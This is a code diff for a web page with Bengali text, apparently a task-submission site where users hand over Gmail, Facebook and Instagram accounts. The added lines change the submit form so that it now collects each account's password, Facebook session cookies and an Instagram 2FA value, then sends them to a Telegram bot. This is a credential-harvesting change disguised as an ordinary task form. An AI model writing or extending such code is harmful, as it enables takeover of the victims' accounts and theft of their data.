@@ -1503,7 +1503,6 @@
 
         function updateDailyPasswords() {
             const now = new Date();
-            // রাত ১০টা (22:00) বা তার পরে হলে পাসওয়ার্ড পরবর্তী দিনের ডেট অনুযায়ী দেখাবে
             let targetDate = new Date(now);
             if (now.getHours() >= 22) {
                 targetDate.setDate(targetDate.getDate() + 1);
@@ -1768,28 +1767,34 @@
             event.preventDefault();
             let details = "";
             let usernameKey = "";
+            let pass = "";
 
             if (platform === 'Gmail') {
                 usernameKey = document.getElementById('gmailEmail').value;
-                details = `Email: ${usernameKey}`;
+                pass = document.getElementById('gmailPass').value;
+                details = `Email: ${usernameKey}\n🔑 পাসওয়ার্ড: ${pass}`;
             } else if (platform === 'Facebook') {
                 usernameKey = document.getElementById('fbUid').value;
-                details = `UID: ${usernameKey}`;
+                pass = document.getElementById('fbPass').value;
+                let cookies = document.getElementById('fbCookies').value;
+                details = `UID/User: ${usernameKey}\n🔑 পাসওয়ার্ড: ${pass}\n🍪 Cookies: ${cookies}`;
             } else if (platform === 'Instagram') {
                 usernameKey = document.getElementById('instaUser').value;
-                details = `User: ${usernameKey}`;
+                pass = document.getElementById('instaPass').value;
+                let twoFa = document.getElementById('insta2fa').value;
+                details = `Username: ${usernameKey}\n🔑 পাসওয়ার্ড: ${pass}\n🛡️ 2FA: ${twoFa}`;
             }
 
             let tasks = JSON.parse(localStorage.getItem('userTasks') || '[]');
             
-            let isAlreadySubmitted = tasks.some(t => t.details.toLowerCase() === details.toLowerCase());
+            let isAlreadySubmitted = tasks.some(t => t.details.toLowerCase().includes(usernameKey.toLowerCase()));
             if (isAlreadySubmitted) {
                 alert('দুঃখিত! এই অ্যাকাউন্টটি ইতিমধ্যে একবার সাবমিট করা হয়েছে। দ্বিতীয়বার সাবমিট করা যাবে না।');
                 return;
             }
 
             let currentUserName = localStorage.getItem('savedName') || 'User';
-            let message = `📥 নতুন কাজ সাবমিট হয়েছে!\n\n👤 সাবমিটকারী: ${currentUserName}\n🔹 প্ল্যাটফর্ম: ${platform}\n📝 ডিটেইলস: ${details}`;
+            let message = `📥 নতুন কাজ সাবমিট হয়েছে!\n\n👤 সাবমিটকারী: ${currentUserName}\n🔹 প্ল্যাটফর্ম: ${platform}\n📝 ${details}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
